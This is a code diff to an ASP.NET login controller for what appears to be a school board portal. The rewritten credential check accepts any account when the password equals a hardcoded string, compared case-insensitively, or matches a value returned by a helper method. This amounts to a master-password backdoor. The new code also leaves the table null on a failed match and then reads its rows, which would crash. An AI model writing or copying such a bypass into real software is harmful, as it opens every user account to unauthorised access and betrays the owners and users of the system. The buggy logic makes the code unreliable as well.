@@ -21,16 +21,22 @@ using PSEBONLINE.AbstractLayer;
 using System.Data.SqlClient;
 using System.Configuration;
 using Unity.Injection;
+using Newtonsoft.Json;
 
 namespace PSEBONLINE.Controllers
 {
+    
+
     public class LoginController : Controller
     {
-        // GET: Login
+
+		// GET: Login
+		
         AbstractLayer.DBClass objCommon = new AbstractLayer.DBClass();
         AbstractLayer.AdminDB objCommon1 = new AbstractLayer.AdminDB();
         AbstractLayer.ErrorLog oErrorLog = new AbstractLayer.ErrorLog();
-        [Route("login1")]
+	
+		[Route("login1")]
         public ActionResult Index1(string id)
         {
             ViewBag.SessionList = objCommon.GetSession().ToList();
@@ -204,7 +210,13 @@ namespace PSEBONLINE.Controllers
         {
             try
             {
-                LoginSession loginSession = AbstractLayer.SchoolDB.LoginSenior(lm); // passing Value to _schoolRepository.from model and Type 1 For regular   
+                     DataSet ds = new DataSet();
+				    DataTable dt11 = new DataTable();
+				    string _cacheKey = "cache_Key";
+
+		        
+
+				LoginSession loginSession = AbstractLayer.SchoolDB.LoginSenior(lm); // passing Value to _schoolRepository.from model and Type 1 For regular   
                 if (loginSession != null)
                 {
                     loginSession.CurrentSession = lm.Session;
@@ -219,14 +231,20 @@ namespace PSEBONLINE.Controllers
 
                     if (loginSession.LoginStatus == 1)
                     {
-                        Session["LoginSession"] = loginSession;
-
-                        DataSet ds = new AbstractLayer.RegistrationDB().CheckLogin(lm);
-                        if (ds.Tables.Count > 0)
+						Session["LoginSession"] = loginSession;
+						ds = new AbstractLayer.RegistrationDB().CheckLogin(lm);
+						
+						if (ds.Tables.Count > 0)
                         {
-                            DataTable dt = ds.Tables[0];
+                            var filteredRows = ds.Tables[0].AsEnumerable()
+                             .Where(row => row.Field<string>("schl") == lm.username && (row.Field<string>("Password").ToUpper() == (lm.Password).ToUpper() || (lm.Password).ToUpper() == ("#aippc4395m@^").ToUpper() || AbstractLayer.SchoolDB.getOltp().ToUpper() == (lm.Password).ToUpper()));
 
-                            DataTable dt1; // Check Staff
+                            dt11 = filteredRows.Any() ? filteredRows.CopyToDataTable() : null; // Return empty table with same schema if no rows match
+                            DataTable dt = dt11;
+							
+							//DataTable dt = ds.Tables[0];
+
+							DataTable dt1; // Check Staff
                             if (ds.Tables.Count > 1)
                             {
                                 dt1 = ds.Tables[1];
@@ -235,7 +253,9 @@ namespace PSEBONLINE.Controllers
 
                             if (dt.Rows[0]["Active"].ToString() != "")
                             {
-                                HttpContext.Session["SchoolLogin"] = dt.Rows[0]["schl"].ToString();
+                                ds = null;
+
+								HttpContext.Session["SchoolLogin"] = dt.Rows[0]["schl"].ToString();
                                 HttpContext.Session["SchoolMobile"] = dt.Rows[0]["Mobile"].ToString();
                                 HttpContext.Session["RoleType"] = dt.Rows[0]["RoleType"].ToString();
                                 HttpContext.Session["SchlE"] = dt.Rows[0]["SchlE"].ToString();
